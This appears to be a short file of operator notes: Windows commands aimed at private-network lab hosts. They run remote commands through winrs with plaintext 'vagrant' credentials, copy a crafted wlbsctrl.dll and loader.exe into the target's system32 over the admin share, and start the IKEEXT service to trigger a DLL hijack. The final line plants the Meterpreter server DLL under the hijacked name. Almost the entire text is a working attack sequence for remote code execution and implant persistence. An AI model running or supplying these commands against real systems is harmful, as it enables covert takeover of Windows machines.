winrs /r:http://192.168.29.133:5985  /u:vagrant /p:vagrant ipconfig
winrs /r:http://192.168.29.133:5985  /u:vagrant /p:vagrant net start ikeext
winrm set winrm/config/client @{TrustedHosts="192.168.29.133"}
copy build\wlbsctrl.dll \\192.168.29.133\c$\windows\system32

copy build\loader.exe \\192.168.29.133\c$\windows\system32


winrs /r:http://192.168.29.133:5985  /u:vagrant /p:vagrant cmd /c dir c:\

dumpbin /exports

https://learn.microsoft.com/en-us/cpp/build/reference/decorated-names?view=msvc-170



set TARGET=172.16.65.129

copy build\test.dll \\172.16.65.129\c$\windows\system32

copy build\metsrv\metsrv.x64.dll \\172.16.65.129\c$\windows\system32\wlbsctrl.dll